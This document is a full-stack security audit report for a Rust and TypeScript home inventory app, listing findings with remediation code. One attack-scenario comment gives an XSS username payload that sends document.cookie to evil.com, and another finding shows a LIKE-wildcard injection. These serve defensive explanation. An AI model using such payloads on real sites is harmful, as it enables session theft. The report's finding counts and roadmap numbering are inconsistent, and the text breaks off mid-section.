# Security Audit Report - Home Registry

**Date:** February 11, 2026  
**Auditor:** Security Review  
**Scope:** Full-stack security analysis (Rust Backend, TypeScript Frontend, Supply Chain)

## Executive Summary

This audit identified **23 security findings** across the Rust backend, TypeScript frontend, and supply chain. The most critical issues relate to missing security headers, rate limiting, CORS configuration, and potential XSS vectors via `document.write()`.

**Risk Distribution:**
- 🔴 Critical: 4 findings
- 🟠 High: 9 findings
- 🟡 Medium: 7 findings
- 🟢 Low: 3 findings

---

## RUST BACKEND FINDINGS

### 🔴 CRITICAL

#### 1. Missing Rate Limiting
**Risk Level:** Critical  
**Location:** All API endpoints  
**Issue:** No rate limiting middleware configured. Login, registration, and API endpoints are vulnerable to brute-force and DoS attacks.  

**Why it matters:** An attacker can attempt unlimited password guesses or overwhelm the server with requests. This is especially critical for authentication endpoints where credential stuffing attacks are common.

**Remediation:**
```rust
// Add to Cargo.toml:
// actix-governor = "0.5"

// In src/main.rs:
use actix_governor::{Governor, GovernorConfigBuilder};

let governor_conf = GovernorConfigBuilder::default()
    .per_second(2)
    .burst_size(5)
    .finish()
    .unwrap();

// Wrap sensitive routes:
.service(
    web::scope("/api/auth")
        .wrap(Governor::new(&governor_conf))
        .service(login)
        .service(register)
)
```

#### 2. Missing Security Headers
**Risk Level:** Critical  
**Location:** `src/main.rs`  
**Issue:** No security headers configured (X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, X-XSS-Protection, Referrer-Policy).  

**Why it matters:** 
- No X-Frame-Options: Vulnerable to clickjacking attacks
- No X-Content-Type-Options: Browser can execute malicious files with wrong MIME type
- No CSP: Cannot block inline scripts from XSS attacks
- No Referrer-Policy: May leak sensitive URLs to third parties

**Remediation:**
```rust
// In src/main.rs HttpServer configuration:
use actix_web::middleware::DefaultHeaders;

.wrap(DefaultHeaders::new()
    .add(("X-Frame-Options", "DENY"))
    .add(("X-Content-Type-Options", "nosniff"))
    .add(("X-XSS-Protection", "1; mode=block"))
    .add(("Referrer-Policy", "strict-origin-when-cross-origin"))
    .add(("Permissions-Policy", "geolocation=(), microphone=(), camera=()"))
    .add(("Content-Security-Policy", 
          "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:"))
)
```

#### 3. CORS Not Configured
**Risk Level:** Critical  
**Location:** `src/main.rs`  
**Issue:** `actix-cors` is a dependency but not configured in the application. This means the default CORS policy applies, which may be too permissive.

**Why it matters:** Without proper CORS configuration, any website can make authenticated requests to your API, leading to CSRF attacks and unauthorized data access.

**Remediation:**
```rust
use actix_cors::Cors;
use actix_web::http::header;

.wrap(
    Cors::default()
        .allowed_origin("https://your-production-domain.com")
        .allowed_origin_fn(|origin, _req_head| {
            // Allow localhost in development
            origin.as_bytes().starts_with(b"http://localhost")
        })
        .allowed_methods(vec!["GET", "POST", "PUT", "DELETE"])
        .allowed_headers(vec![header::AUTHORIZATION, header::CONTENT_TYPE, header::ACCEPT])
        .supports_credentials()
        .max_age(3600)
)
```

#### 4. Database Errors Exposed in API Responses
**Risk Level:** Critical  
**Location:** `src/api/mod.rs`, `src/api/auth.rs` (throughout)  
**Issue:** Raw database errors are returned to clients via `format!("Database error: {}", e)`

**Why it matters:** This leaks:
- Database schema and table names
- Query structure and SQL syntax
- Internal implementation details
- Potential attack vectors for SQL injection

**Example leak:**
```
"Database error: relation \"items\" does not exist"
"Database error: column \"user_id\" of relation \"inventories\" does not exist"
```

**Remediation:**
```rust
// Create src/error.rs
#[derive(Debug, thiserror::Error)]
pub enum ApiError {
    #[error("Resource not found")]
    NotFound,
    #[error("Internal server error")]
    Internal,
    #[error("Invalid input: {0}")]
    Validation(String),
    #[error("Unauthorized")]
    Unauthorized,
}

// Map database errors internally:
Err(e) => {
    error!("Database error (user won't see this): {}", e);
    Ok(HttpResponse::InternalServerError().json(ErrorResponse {
        success: false,
        error: "An internal error occurred".to_string(),
        message: Some("Please try again later".to_string()),
    }))
}
```

---

### 🟠 HIGH

#### 5. Panic on Startup - Non-Graceful Failure
**Risk Level:** High  
**Location:** `src/db/mod.rs` lines 23, 30, 54  
**Issue:** Uses `.expect()` and `panic!()` for database URL parsing and pool creation. Production servers should handle startup errors gracefully.

**Why it matters:**
- Crashes reveal stack traces and internal file paths
- No graceful shutdown or cleanup
- Deployment orchestrators see immediate crash-loops
- Cannot implement retry logic or fallback strategies

**Remediation:**
```rust
pub async fn get_pool() -> Result<Pool, Box<dyn std::error::Error>> {
    let db_url = env::var("DATABASE_URL")
        .map_err(|_| "DATABASE_URL environment variable not set")?;

    let url = db_url.strip_prefix("postgres://")
        .ok_or("Invalid DATABASE_URL format: must start with postgres://")?;
    
    let parts: Vec<&str> = url.split('@').collect();
    if parts.len() != 2 {
        return Err("Invalid DATABASE_URL format: expected user:pass@host/db".into());
    }

    // ... rest of parsing with ? operator
    
    cfg.create_pool(None, NoTls)
        .map_err(|e| format!("Failed to create database pool: {}", e).into())
}

// In main.rs:
let pool = match db::get_pool().await {
    Ok(p) => p,
    Err(e) => {
        error!("Failed to initialize database: {}", e);
        std::process::exit(1);
    }
};
```

#### 6. Missing Input Validation on Most Fields
**Risk Level:** High  
**Location:** `src/models/mod.rs`, all request structures  
**Issue:** Only username/password have validation. Item names, descriptions, notes, inventory names, etc. have no length limits or content validation.

**Why it matters:**
- DoS via extremely long strings (megabytes of text)
- Database storage exhaustion
- Application memory exhaustion
- Potential for injection attacks in future features

**Remediation:**
```rust
// Add to Cargo.toml:
// validator = { version = "0.16", features = ["derive"] }

use validator::Validate;

#[derive(Deserialize, Validate)]
pub struct CreateItemRequest {
    #[validate(length(min = 1, max = 255, message = "Name must be 1-255 characters"))]
    pub name: String,
    
    #[validate(length(max = 5000, message = "Description must be under 5000 characters"))]
    pub description: Option<String>,
    
    #[validate(length(max = 255))]
    pub category: Option<String>,
    
    #[validate(length(max = 500))]
    pub location: Option<String>,
    
    #[validate(length(max = 10000))]
    pub notes: Option<String>,
    
    #[validate(range(min = 0, max = 1_000_000))]
    pub quantity: Option<i32>,
    
    #[validate(range(min = 0.0, max = 1_000_000_000.0))]
    pub purchase_price: Option<f64>,
}

// In handlers:
pub async fn create_item(
    pool: web::Data<Pool>,
    req: web::Json<CreateItemRequest>
) -> Result<impl Responder> {
    // Validate before processing
    if let Err(e) = req.validate() {
        return Ok(HttpResponse::BadRequest().json(ErrorResponse {
            success: false,
            error: e.to_string(),
            message: Some("Invalid input".to_string()),
        }));
    }
    // ... rest of handler
}
```

#### 7. SQL LIKE Pattern Injection
**Risk Level:** High  
**Location:** `src/db/mod.rs` lines 331-344 (`search_items`)  
**Issue:** User input is concatenated into LIKE pattern without escaping wildcards `%` and `_`.

**Why it matters:** User can inject wildcards to:
- Match everything with `%`
- Bypass filtering with `_` single-char wildcard
- Cause performance issues with leading `%` (full table scan)

**Example attack:**
```
Search query: "%"
Resulting pattern: "%%%"
Effect: Returns ALL items in database
```

**Remediation:**
```rust
fn escape_like_pattern(input: &str) -> String {
    input.replace('\\', "\\\\")
         .replace('%', "\\%")
         .replace('_', "\\_")
}

pub async fn search_items(&self, query: &str) -> Result<Vec<Item>, Box<dyn std::error::Error>> {
    let client = self.pool.get().await?;
    
    let escaped_query = escape_like_pattern(&query.to_lowercase());
    let search_pattern = format!("%{}%", escaped_query);
    
    let rows = client.query(
        "SELECT ... FROM items 
         WHERE LOWER(name) LIKE $1 ESCAPE '\\' 
            OR LOWER(description) LIKE $1 ESCAPE '\\'
            OR LOWER(category) LIKE $1 ESCAPE '\\'
            OR LOWER(location) LIKE $1 ESCAPE '\\'
         ORDER BY created_at DESC",
        &[&search_pattern],
    ).await?;
    // ...
}
```

#### 8. Dynamic SQL Query Building
**Risk Level:** High  
**Location:** `src/db/mod.rs` lines 198-290 (`update_item`, `update_inventory`)  
**Issue:** Queries are built dynamically with `format!()` macro. While parameterized values are used correctly, the pattern is error-prone.

**Why it matters:**
- Harder to audit for SQL injection
- Future developers may accidentally interpolate user input
- Query structure depends on runtime logic
- No compile-time verification

**Remediation:**
```rust
// Option 1: Use explicit COALESCE for updates
let query = "
    UPDATE items 
    SET name = COALESCE($1, name),
        description = COALESCE($2, description),
        category = COALESCE($3, category),
        -- ... all fields
        updated_at = NOW()
    WHERE id = $last_param
    RETURNING *";

// Option 2: Use query builder like sea-query
use sea_query::{PostgresQueryBuilder, Query, Table};

let mut update = Query::update()
    .table(Items::Table)
    .and_where(Expr::col(Items::Id).eq(id))
    .to_owned();

if let Some(name) = request.name {
    update.value(Items::Name, name);
}
// Compile-time verified, no format! needed
```

#### 9. .unwrap() in Production Code Path
**Risk Level:** High  
**Location:** `src/db/mod.rs` line 595  
**Issue:** `organizer_type.id.unwrap()` will panic if ID is None

**Why it matters:**
- Runtime panic crashes the request handler thread
- No error message to client
- Can be triggered by data inconsistency

**Remediation:**
```rust
let options = if organizer_type.input_type == "select" {
    let organizer_id = organizer_type.id
        .ok_or("Organizer type missing ID")?;
    self.get_organizer_options(organizer_id).await?
} else {
    Vec::new()
};
```

---

### 🟡 MEDIUM

#### 10. Weak Password Policy
**Risk Level:** Medium  
**Location:** `src/auth/mod.rs` lines 211-221  
**Issue:** Password validation only requires 8 characters with no complexity requirements.

**Why it matters:**
- "password" and "12345678" are valid passwords
- Vulnerable to dictionary attacks
- No protection against common passwords
- Industry standard is 12+ characters with complexity

**Remediation:**
```rust
pub fn validate_password(password: &str) -> Result<(), &'static str> {
    if password.len() < 12 {
        return Err("Password must be at least 12 characters long");
    }
    if password.len() > 128 {
        return Err("Password must be at most 128 characters long");
    }
    
    let has_uppercase = password.chars().any(|c| c.is_uppercase());
    let has_lowercase = password.chars().any(|c| c.is_lowercase());
    let has_digit = password.chars().any(|c| c.is_numeric());
    let has_special = password.chars().any(|c| !c.is_alphanumeric());
    
    if !has_uppercase {
        return Err("Password must contain at least one uppercase letter");
    }
    if !has_lowercase {
        return Err("Password must contain at least one lowercase letter");
    }
    if !has_digit {
        return Err("Password must contain at least one number");
    }
    if !has_special {
        return Err("Password must contain at least one special character");
    }
    
    // Optional: Check against common passwords list
    const COMMON_PASSWORDS: &[&str] = &[
        "password", "123456789", "qwerty", "admin123", 
        // ... add more from OWASP list
    ];
    if COMMON_PASSWORDS.contains(&password.to_lowercase().as_str()) {
        return Err("Password is too common");
    }
    
    Ok(())
}
```

#### 11. JWT Token Cookie Without Security Flags
**Risk Level:** Medium  
**Location:** `src/auth/mod.rs` lines 151-157  
**Issue:** Code checks for `auth_token` cookie but there's no evidence of HttpOnly/Secure cookie creation.

**Why it matters:**
- JavaScript can access tokens via `document.cookie` (XSS vulnerability)
- Tokens sent over HTTP connections (MITM vulnerability)
- No SameSite protection (CSRF vulnerability)

**Remediation:**
```rust
// When setting cookie in login/register responses:
use actix_web::cookie::{Cookie, SameSite};
use actix_web::http::header;

let cookie = Cookie::build("auth_token", token)
    .http_only(true)          // Prevent JavaScript access
    .secure(true)             // Only send over HTTPS
    .same_site(SameSite::Strict)  // CSRF protection
    .max_age(time::Duration::hours(24))
    .path("/")
    .finish();

HttpResponse::Ok()
    .cookie(cookie)
    .json(response)
```

#### 12. Missing Structured Logging / Correlation IDs
**Risk Level:** Medium  
**Location:** Throughout codebase  
**Issue:** All logging uses plain `log::info!()` and `log::error!()` without structured fields or request correlation IDs.

**Why it matters:**
- Cannot trace requests across distributed systems
- Cannot correlate errors with specific requests
- Hard to filter logs by user, inventory, or operation
- No metrics extraction from logs

**Remediation:**
```rust
// Replace env_logger with tracing
// Cargo.toml:
// tracing = "0.1"
// tracing-subscriber = { version = "0.3", features = ["json"] }
// tracing-actix-web = "0.7"

use tracing_actix_web::TracingLogger;
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

fn main() -> std::io::Result<()> {
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| "info".into())
        ))
        .with(tracing_subscriber::fmt::layer().json())
        .init();
    
    HttpServer::new(|| {
        App::new()
            .wrap(TracingLogger::default())  // Adds correlation IDs
            // ...
    })
}

// In handlers:
tracing::info!(
    user_id = %auth_ctx.user_id,
    inventory_id = %inventory_id,
    "Inventory deleted successfully"
);
```

#### 13. Box<dyn std::error::Error> Loses Type Information
**Risk Level:** Medium  
**Location:** `src/db/mod.rs` (all public methods)  
**Issue:** All database methods return `Box<dyn std::error::Error>`, losing specific error type information.

**Why it matters:**
- Cannot handle different errors differently
- Cannot extract error codes for clients
- Forces string matching for error handling
- No compile-time exhaustiveness checking

**Remediation:**
```rust
// Create src/db/error.rs
#[derive(Debug, thiserror::Error)]
pub enum DbError {
    #[error("Database connection pool error")]
    Pool(#[from] deadpool_postgres::PoolError),
    
    #[error("Database query failed")]
    Query(#[from] tokio_postgres::Error),
    
    #[error("Resource not found: {0}")]
    NotFound(String),
    
    #[error("Constraint violation: {0}")]
    Constraint(String),
    
    #[error("Invalid data format")]
    InvalidData,
}

// Use in db methods:
pub async fn get_item_by_id(&self, id: i32) -> Result<Option<Item>, DbError> {
    let client = self.pool.get().await?;
    // ...
}

// In API handlers, map to proper HTTP status:
match db_service.get_item_by_id(id).await {
    Ok(Some(item)) => Ok(HttpResponse::Ok().json(item)),
    Ok(None) => Ok(HttpResponse::NotFound().json(error_response)),
    Err(DbError::Pool(_)) => Ok(HttpResponse::ServiceUnavailable().json(error_response)),
    Err(DbError::Constraint(msg)) => Ok(HttpResponse::BadRequest().json(error_response)),
    Err(_) => Ok(HttpResponse::InternalServerError().json(error_response)),
}
```

#### 14. No Audit Logging for Security Events
**Risk Level:** Medium  
**Location:** `src/api/auth.rs`  
**Issue:** Security-sensitive operations (login failures, password changes, admin actions) are logged but not to a separate audit trail.

**Why it matters:**
- Cannot track unauthorized access attempts
- No forensics capability after breach
- Cannot detect brute-force attacks
- Compliance requirements (GDPR, SOC2) require audit trails

**Remediation:**
```rust
// Create separate audit log module
pub struct AuditLog;

impl AuditLog {
    pub fn log_event(event_type: &str, user_id: Option<Uuid>, details: serde_json::Value) {
        tracing::info!(
            target: "audit",
            event_type = %event_type,
            user_id = ?user_id,
            details = %details,
            timestamp = %chrono::Utc::now(),
            "Security audit event"
        );
    }
}

// Use in critical operations:
AuditLog::log_event(
    "login_failure",
    None,
    json!({ "username": username, "reason": "invalid_password", "ip": req.peer_addr() })
);

AuditLog::log_event(
    "password_change",
    Some(auth_ctx.user_id),
    json!({ "username": auth_ctx.username })
);
```

#### 15. JWT Secret Auto-Generation Risk
**Risk Level:** Medium  
**Location:** `src/auth/mod.rs` lines 30-76  
**Issue:** JWT secret is auto-generated and persisted to filesystem. In multi-instance deployments, each instance generates its own secret.

**Why it matters:**
- Tokens issued by instance A won't validate on instance B
- Secret changes on container restart invalidate all tokens
- Race conditions if multiple instances start simultaneously
- Secrets should be provisioned externally, not generated at runtime

**Remediation:**
```rust
// Remove auto-generation logic
pub fn get_jwt_secret() -> Result<String, &'static str> {
    JWT_SECRET.get_or_init(|| {
        // Try environment variable
        if let Ok(secret) = env::var("JWT_SECRET") {
            if secret.len() >= 32 {
                log::info!("Using JWT secret from environment");
                return secret;
            } else {
                log::error!("JWT_SECRET too short, must be >= 32 characters");
            }
        }
        
        // Try Docker secret
        if let Ok(secret) = std::fs::read_to_string("/run/secrets/jwt_secret") {
            let secret = secret.trim();
            if secret.len() >= 32 {
                log::info!("Using JWT secret from Docker secrets");
                return secret.to_string();
            }
        }
        
        log::error!("No JWT_SECRET found and auto-generation disabled");
        panic!("JWT_SECRET must be provided via environment or Docker secret. Generate with: openssl rand -base64 32");
    }).clone()
}

// In documentation:
// Generate secret: openssl rand -base64 64
// Docker: echo "your-secret" | docker secret create jwt_secret -
// Kubernetes: kubectl create secret generic jwt-secret --from-literal=jwt_secret="your-secret"
```

---

### 🟢 LOW

#### 16. Hardcoded Version String
**Risk Level:** Low  
**Location:** `src/main.rs` line 15  
**Issue:** Version hardcoded as `"0.1.0"` in health check endpoint.

**Why it matters:**
- Version drift from Cargo.toml
- Must manually update in two places
- Inconsistent version reporting

**Remediation:**
```rust
async fn health() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "status": "healthy",
        "service": "home-registry",
        "version": env!("CARGO_PKG_VERSION"),  // Auto-populated from Cargo.toml
        "timestamp": chrono::Utc::now()
    }))
}
```

#### 17. Debug Configuration Not Gated
**Risk Level:** Low  
**Location:** Throughout codebase  
**Issue:** No `#[cfg(debug_assertions)]` guards for development-only features or verbose logging.

**Why it matters:**
- Development logging may leak sensitive information in production
- Debug symbols increase binary size
- Performance overhead from unnecessary logging

**Remediation:**
```rust
#[cfg(debug_assertions)]
log::debug!("Debug-only info: {:?}", sensitive_data);

#[cfg(debug_assertions)]
fn development_only_feature() {
    // Only compiled in debug builds
}

// In Cargo.toml:
[profile.release]
opt-level = 3
lto = true
debug = false  // Ensure debug info stripped
strip = true   // Strip symbols
```

---

## TYPESCRIPT FRONTEND FINDINGS

### 🔴 CRITICAL

#### 18. XSS via document.write()
**Risk Level:** Critical  
**Locations:**
- `frontend/src/pages/SetupPage.tsx` line 163
- `frontend/src/pages/RegisterPage.tsx` line 137
- `frontend/src/components/RecoveryCodesSection.tsx` line 127

**Issue:** Uses `document.write()` with template literals containing user data (username, recovery codes) in print functionality.

**Why it matters:** If any user-controlled data contains `<script>` tags or malicious HTML, it will execute in the print window context. While recovery codes are generated server-side, usernames are user-controlled.

**Attack scenario:**
```javascript
// Attacker registers with username: <script>fetch('evil.com?c='+document.cookie)</script>
// When they print recovery codes, the script executes in print window
```

**Remediation:**
```typescript
// Option 1: Use textContent for auto-escaping
const printCodes = () => {
  if (!recoveryCodes) return;
  
  const printWindow = window.open('', '', 'width=800,height=600');
  if (!printWindow) return;
  
  // Build DOM safely
  printWindow.document.body.innerHTML = '';
  const container = printWindow.document.createElement('div');
  
  const title = printWindow.document.createElement('h1');
  title.textContent = 'Home Registry Recovery Codes';  // Auto-escaped
  container.appendChild(title);
  
  const usernameP = printWindow.document.createElement('p');
  usernameP.textContent = `Username: ${formData.username}`;  // Auto-escaped
  container.appendChild(usernameP);
  
  // ... build rest of DOM
  printWindow.document.body.appendChild(container);
  printWindow.print();
};

// Option 2: Use DOMPurify for sanitization
import DOMPurify from 'dompurify';

printWindow.document.write(DOMPurify.sanitize(`
  <html>
    <head>...</head>
    <body>
      <h1>Recovery Codes</h1>
      <p>Username: ${DOMPurify.sanitize(formData.username)}</p>
      ...
    </body>
  </html>
`));
```

---

### 🟠 HIGH

#### 19. innerHTML Usage in Component
**Risk Level:** High  
**Location:** `frontend/src/components/RecoveryCodesSection.tsx` line 124  
**Issue:** `const printContent = codesRef.current.innerHTML;` extracts HTML content for printing.

**Why it matters:**
- If any injected content exists in the DOM, it gets copied to print window
- Bypasses React's XSS protection
- innerHTML execution context is different from textContent

**Remediation:**
```typescript
// Instead of copying innerHTML, build print content from data
const handlePrint = () => {
  if (!codes) return;
  
  // Build print content from data, not DOM
  const printWindow = window.open('', '_blank');
  if (!printWindow) return;
  
  const codesList = codes.map((code, i) => 
    `<div class="code">${escapeHtml(code)}</div>`
  ).join('');
  
  printWindow.document.write(`
    <html>
      <head>
        <title>Recovery Codes - Home Registry</title>
        <style>/* ... styles ... */</style>
      </head>
      <body>
        <h2>Home Registry - Recovery Codes</h2>
        <div class="codes">${codesList}</div>
      </body>
    </html>
  `);
};

function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

#### 20. Type Assertions with `as any` Bypass Type Safety
**Risk Level:** High  
**Locations:**
- `frontend/src/services/api.ts` lines 92, 104
- `frontend/src/pages/InventoryDetailPage.tsx` (5 instances with `settings?.currency as any`)

**Issue:** Using `as any` completely disables TypeScript's type checking, defeating the purpose of using TypeScript.

**Why it matters:**
- Runtime type errors at production
- No IDE autocomplete or type hints
- Type system cannot catch bugs
- Makes refactoring dangerous

**Remediation:**
```typescript
// In api.ts - Define proper error structure
interface ErrorApiResponse {
  success: false;
  error: string;
  message?: string;
}

interface SuccessApiResponse<T> {
  success: true;
  data: T;
  message?: string;
}

type ApiResponse<T> = SuccessApiResponse<T> | ErrorApiResponse;

async function handleResponse<T>(response: Response): Promise<ApiResponse<T>> {
  const contentType = response.headers.get('content-type');
  if (!contentType?.includes('application/json')) {
    return {
      success: false,
      error: `Server error (${response.status})`,
    };
  }
  
  return await response.json() as ApiResponse<T>;  // Properly typed
}

// In InventoryDetailPage.tsx - Define proper types
type Currency = 'USD' | 'EUR' | 'GBP' | 'JPY' | 'AUD' | 'CAD';
type DateFormat = 'MM/DD/YYYY' | 'DD/MM/YYYY' | 'YYYY-MM-DD';

const currency: Currency = (settings?.currency as Currency) || 'USD';
const dateFormat: DateFormat = (settings?.date_format as DateFormat) || 'MM/DD/YYYY';

// Better: Validate at type guard
function isCurrency(value: unknown): value is Currency {
  return typeof value === 'string' && ['USD', 'EUR', 'GBP', 'JPY', 'AUD', 'CAD'].includes(value);
}

const currency: Currency = isCurrency(settings?.currency) ? settings.currency : 'USD';
```

#### 21. Token Stored in localStorage - XSS Vulnerability
**Risk Level:** High  
**Location:** `frontend/src/context/AuthContext.tsx`  
**Issue:** JWT tokens stored in `localStorage` are accessible to any JavaScript code running on the page.

**Why it matters:**
- Any XSS vulnerability can steal tokens
- Third-party scripts can access localStorage
- No protection against malicious browser extensions
- Tokens persist across sessions (no automatic cleanup)

**Comparison:**
- **localStorage**: Accessible via JavaScript, vulnerable to XSS
- **HttpOnly Cookie**: Not accessible via JavaScript, protected from XSS

**Remediation:**
```typescript
// Backend: Set HttpOnly cookie instead of returning token
// src/api/auth.rs:
use actix_web::cookie::{Cookie, SameSite};

Ok(HttpResponse::Ok()
    .cookie(
        Cookie::build("auth_token", token)
            .http_only(true)
            .secure(true)
            .same_site(SameSite::Strict)
            .max_age(time::Duration::hours(24))
            .path("/")
            .finish()
    )
    .json(ApiResponse {
        success: true,
        data: Some(UserResponse::from(user)),  // Don't include token
        message: Some("Login successful".to_string()),
        error: None,
    }))

// Frontend: Remove localStorage usage
// AuthContext.tsx:
const login = async (username: string, password: string) => {
  const result = await authApi.login({ username, password });
  
  if (result.success && result.data) {
    // Don't store token - it's in HttpOnly cookie now
    setUser(result.data);  // Only store non-sensitive user data
    setIsAuthenticated(true);
    return { success: true };
  }
  // ...
};

// API calls automatically include cookie
// No need to manually add Authorization header
```

---

### 🟡 MEDIUM

#### 22. No Content Security Policy (CSP)
**Risk Level:** Medium  
**Location:** `frontend/index.html` (missing)  
**Issue:** No Content Security Policy defined in meta tag or HTTP headers.

**Why it matters:**
- Browser cannot block inline scripts from XSS attacks
- No protection against malicious external scripts
- No restriction on where resources can be loaded from
- Defense-in-depth layer missing

**Remediation:**
```html
<!-- In frontend/public/index.html or static/index.html -->
<meta http-equiv="Content-Security-Policy" 
      content="
        default-src 'self';
        script-src 'self' 'wasm-unsafe-eval';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        font-src 'self';
        connect-src 'self';
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
      ">

<!-- Or better: Set via HTTP header in Actix-Web (see CRITICAL #2) -->
```

**Note:** `'unsafe-inline'` for styles may be needed for React styling. Gradually tighten by:
1. Moving inline styles to CSS files
2. Using nonce-based CSP with Vite plugin
3. Eventually removing `'unsafe-inline'`

---

### 🟢 LOW

#### 23. TypeScript Strictness Settings Could Be Tighter
**Risk Level:** Low  
**Location:** `frontend/tsconfig.json`  
**Issue:** 
- `noUnusedLocals: false`
- `noUnusedParameters: false`

**Why it matters:**
- Dead code not flagged by TypeScript
- Unused variables may indicate bugs
- Code quality and maintainability

**Remediation:**
```jsonc
{
  "compilerOptions": {
    "strict": true,
    "noUnusedLocals": true,     // Enable
    "noUnusedParameters": true,  // Enable
    "noFallthroughCasesInSwitch": true,
    "noUncheckedIndexedAccess": true,  // Consider adding
    "exactOptionalPropertyTypes": true, // Consider adding
  }
}
```

---

## SUPPLY CHAIN FINDINGS

### 🟠 HIGH

#### 24. Unpinned Dependency Versions
**Risk Level:** High  
**Locations:** `Cargo.toml`, `frontend/package.json`  
**Issue:** Dependencies use version ranges (`^18.3.1`, `"4"`) allowing automatic minor/patch updates.

**Why it matters:**
- Supply chain attacks via compromised package updates
- `npm` and `cargo` auto-update within ranges
- Reproducibility issues across environments
- Breaking changes in "minor" updates
- Example: event-stream, ua-parser-js, colors.js supply chain attacks

**Current problematic patterns:**
```toml
# Cargo.toml
actix-web = "4"              # Allows 4.0.0 to 4.999.999
tokio = { version = "1", ... }
```

```json
// package.json
"react": "^18.3.1"           // Allows 18.3.1 to 18.999.999
"react-router-dom": "^6.28.0"
```

**Remediation:**
```toml
# Cargo.toml - Pin exact versions
actix-web = "=4.4.1"
actix-files = "=0.6.6"
actix-cors = "=0.6.5"
tokio = { version = "=1.35.1", features = ["full"] }
serde = { version = "=1.0.195", features = ["derive"] }
serde_json = "=1.0.111"
# ... pin ALL dependencies
```

```json
// package.json - Remove caret (^) and tilde (~)
{
  "dependencies": {
    "react": "18.3.1",
    "react-dom": "18.3.1",
    "react-router-dom": "6.28.0"
  },
  "devDependencies": {
    "typescript": "5.6.2",
    "vite": "6.0.5"
  }
}
```

**Additional measures:**
```bash
# Verify lockfiles are committed
git add Cargo.lock frontend/package-lock.json

# Configure npm to require lockfile
echo "package-lock=true" >> .npmrc
echo "save-exact=true" >> .npmrc

# Add cargo-deny for supply chain auditing
cargo install cargo-deny
# Create deny.toml configuration
```

---

### 🟡 MEDIUM

#### 25. Missing MSRV (Minimum Supported Rust Version)
**Risk Level:** Medium  
**Location:** `Cargo.toml` (missing field)  
**Issue:** No `rust-version` field defined. Dockerfile uses very recent `rust:1.88` which may not be available in all environments.

**Why it matters:**
- Build failures on older Rust versions without clear error
- Unclear compatibility guarantees
- CI/CD may use different Rust versions
- Dependencies may require features from newer Rust

**Remediation:**
```toml
# Cargo.toml
[package]
name = "home-registry"
version = "0.1.0"
edition = "2021"
rust-version = "1.75.0"  # Add minimum supported Rust version

# Test with minimum version:
# cargo +1.75.0 check
# cargo +1.75.0 build
```

```dockerfile
# Dockerfile - Use specific Rust version matching MSRV
FROM rust:1.75-bookworm AS backend-builder
```

#### 26. No Dependency License Auditing
**Risk Level:** Medium  
**Location:** Build process (missing)  
**Issue:** No automated checking of dependency licenses for compatibility.

**Why it matters:**
- May include GPL dependencies incompatible with your license
- Corporate policies may prohibit certain licenses
- Open source compliance requirements
- Legal liability

**Remediation:**
```bash
# Install cargo-license
cargo install cargo-license

# Check licenses:
cargo license --json > licenses.json

# Install cargo-deny for automated checks
cargo install cargo-deny

# Create deny.toml:
cat > deny.toml << 'EOF'
[licenses]
unlicensed = "deny"
copyleft = "deny"  # or "warn" depending on your needs
allow = [
    "MIT",
    "Apache-2.0",
    "BSD-3-Clause",
    "ISC",
    "CC0-1.0",
]

[bans]
multiple-versions = "warn"
deny = [
    # Add any crates you want to explicitly ban
]
EOF

# Run in CI:
cargo deny check licenses
cargo deny check bans
```

---

### 🟢 LOW (Positive Findings)

✅ **Lockfiles Present**
- `Cargo.lock` exists and should be committed
- `frontend/package-lock.json` exists and should be committed
- Good: Ensures reproducible builds

✅ **TypeScript Strict Mode Enabled**
- `tsconfig.json` has `"strict": true`
- Catches many type-related bugs at compile time

✅ **Modern Rust Edition**
- Using Rust 2021 edition
- Access to latest language features and improvements

---

## PRIORITIZED REMEDIATION ROADMAP

### Phase 1 - Critical Security (Week 1) 
**Goal:** Fix actively exploitable vulnerabilities

| # | Issue | Effort | Impact |
|---|-------|--------|--------|
| 1 | Add rate limiting (auth endpoints minimum) | 2h | Prevents brute-force attacks |
| 2 | Configure CORS properly | 1h | Prevents unauthorized cross-origin requests |
| 3 | Add security headers | 1h | Hardens browser security |
| 4 | Fix XSS via document.write() | 3h | Prevents code execution |
| 5 | Stop exposing DB errors to clients | 2h | Prevents info disclosure |

**Total Week 1:** 9 hours

### Phase 2 - High Impact (Week 2)
**Goal:** Strengthen input validation and error handling

| # | Issue | Effort | Impact |
|---|-------|--------|--------|
| 6 | Add input validation (validator crate) | 4h | Prevents DoS and injection |
| 7 | Replace innerHTML with safe DOM building | 2h | Reduces XSS attack surface |
| 8 | Fix `as any` type assertions | 3h | Restores type safety |
| 9 | Remove panic/expect from startup | 2h | Graceful error handling |
| 10 | Escape SQL LIKE wildcards | 1h | Prevents pattern injection |

**Total Week 2:** 12 hours

### Phase 3 - Hardening (Week 3-4)
**Goal:** Defense in depth and operational improvements

| # | Issue | Effort | Impact |
|---|-------|--------|--------|
| 11 | Strengthen password policy | 1h | Reduces weak passwords |
| 12 | Add CSP meta tags | 1h | Browser-level XSS protection |
| 13 | Migrate to HttpOnly cookies | 4h | Prevents token theft via XSS |
| 14 | Pin all dependencies | 2h | Supply chain security |
| 15 | Add structured logging (tracing) | 4h | Better observability |
| 16 | Create custom error types | 3h | Better error handling |
| 17 | Add audit logging | 3h | Security event tracking |
| 18 | Fix .unwrap() in hot paths | 1h | Prevents panics |

**Total Weeks 3-4:** 19 hours

### Phase 4 - Polish (Ongoing)
**Goal:** Code quality and maintainability

| # | Issue | Effort | Impact |
|---|-------|--------|--------|
| 19 | Enable TypeScript unused variable checks | 1h | Code quality |
| 20 | Replace format! in SQL queries | 6h | Query safety audit |
| 21 | Add MSRV and test with older Rust | 2h | Build stability |
| 22 | Set up cargo-deny for license checks | 2h | Compliance |
| 23 | Use env!() for version strings | 0.5h | Consistency |

**Total Phase 4:** 11.5 hours

---

## ARCHITECTURAL RECOMMENDATIONS

### 1. Authentication Architecture Overhaul
**Current State:** Tokens in localStorage + cookie support  
